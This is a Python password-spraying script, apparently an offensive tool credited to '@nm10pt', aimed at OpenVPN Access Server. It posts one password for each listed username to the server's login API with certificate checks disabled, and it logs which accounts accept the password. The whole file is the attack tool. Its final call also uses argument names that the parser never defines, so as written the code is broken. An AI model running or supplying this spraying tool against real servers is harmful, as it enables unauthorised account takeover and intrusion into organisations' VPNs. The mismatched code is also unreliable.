import requests
import argparse
import urllib3
import enlighten
from colorama import Fore, Style, init
from datetime import datetime
import re

init(autoreset=True)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

MANAGER = enlighten.get_manager()

LOGO = f"""
                            {Fore.LIGHTYELLOW_EX}
                                          ============              
                                      ====================          
                                   ==========================       
                                 ==============================     
                                ================================    
                              ====================================  
                              =============          =============  
                             ============{Fore.LIGHTCYAN_EX}    %%%%%%{Fore.LIGHTYELLOW_EX}    ============ 
                            ==========={Fore.LIGHTCYAN_EX}    %%%%%%%%%%{Fore.LIGHTYELLOW_EX}    ===========
                            =========={Fore.LIGHTCYAN_EX}    %%%%%%%%%%%%{Fore.LIGHTYELLOW_EX}    ==========
                            =========={Fore.LIGHTCYAN_EX}   %%%%%%%%%%%%%%{Fore.LIGHTYELLOW_EX}   ==========
                            =========={Fore.LIGHTCYAN_EX}   %%%%%%%%%%%%%%{Fore.LIGHTYELLOW_EX}   ==========
                            =========={Fore.LIGHTCYAN_EX}    %%%%%%%%%%%%{Fore.LIGHTYELLOW_EX}    ==========
                            ==========={Fore.LIGHTCYAN_EX}    %%%%%%%%%%{Fore.LIGHTYELLOW_EX}    ===========
                            ============{Fore.LIGHTCYAN_EX}     %%%%%%{Fore.LIGHTYELLOW_EX}     ============
                             ============{Fore.LIGHTCYAN_EX}    %%%%%%{Fore.LIGHTYELLOW_EX}    ============ 
                              ==========={Fore.LIGHTCYAN_EX}   %%%%%%%%{Fore.LIGHTYELLOW_EX}   ===========  
                               ========={Fore.LIGHTCYAN_EX}    %%%%%%%%{Fore.LIGHTYELLOW_EX}    =========   
                                ========{Fore.LIGHTCYAN_EX}   %%%%%%%%%{Fore.LIGHTYELLOW_EX}    ========    
                                  ====={Fore.LIGHTCYAN_EX}    %%%%%%%%%%{Fore.LIGHTYELLOW_EX}    =====      
                                     =={Fore.LIGHTCYAN_EX}    %%%%%%%%%%{Fore.LIGHTYELLOW_EX}    ==         
                                        {Fore.LIGHTCYAN_EX}   %%%%%%%%%%                          

                            {Fore.LIGHTGREEN_EX}               @nm10pt
                            {Fore.LIGHTBLACK_EX} OpenVPN Access Server Password Spray 

                            {Style.RESET_ALL}               
"""
def remove_color_codes(text):
    """Remove ANSI color codes from a string."""
    return re.sub(r'\x1B[@-_][0-?]*[ -/]*[@-~]', '', text)

def log_message(message, log_file=None):
    """Logs the message with a timestamp, optionally to a file."""
    timestamped_message = f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')} - {message}"
    print(timestamped_message)
    if log_file:
        with open(log_file, 'a') as f:
            f.write(remove_color_codes(timestamped_message) + '\n')

def load_file(file_path):
    """Loads content from a file and returns it as a list."""
    with open(file_path, 'r') as file:
        return [line.strip() for line in file]

def send_request(target_host, target_port, username, password):
    """Sends an authentication request to the target server, returns the response."""
    url = f"https://{target_host}:{target_port}/api/auth/login/userpassword"
    json_data = {
        'username': username,
        'password': password
    }
    try:
        response = requests.post(url, json=json_data, verify=False)
        return response.status_code, response.text
    except requests.exceptions.RequestException as e:
        return None, str(e)

def main(target_host, target_port, users_file, password, log_file=None):
    users = load_file(users_file)

    pbar = MANAGER.counter(total=len(users), desc="Spraying", unit="users")

    log_message(f"{Fore.BLUE}Starting Password Spray...{Style.RESET_ALL}", log_file)

    for username in users:
        status_code, response_text = send_request(target_host, target_port, username, password)
        if status_code == 200:
            log_message(f"{Fore.GREEN}Success!{Style.RESET_ALL} Username: {username}, Password: {password}", log_file)
        elif status_code == 403:
            log_message(f"{Fore.YELLOW}Failed.{Style.RESET_ALL} Username: {username}, Password: {password}", log_file)
        else:
            log_message(f"{Fore.RED}Failed request.{Style.RESET_ALL} Username: {username}, Password: {password} - Status: {status_code}, Error: {response_text}", log_file)
        pbar.update()

    log_message(f"{Fore.BLUE}Done!{Style.RESET_ALL}", log_file)
    pbar.close() 

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Password Spray for OpenVPN Access Server.')
    parser.add_argument('-t','--target', required=True, help='Target host (IP or hostname)')
    parser.add_argument('--target-port', type=int, default=443, help='Target port')
    parser.add_argument('-u','--users-file', required=True, help='File containing a list of usernames')
    parser.add_argument('-p','--password', required=True, help='Password to attempt for each user')
    parser.add_argument('-o','--outfile', help='Output file')

    print(LOGO)

    args = parser.parse_args()

    main(args.host, args.port, args.users, args.password, args.logfile)
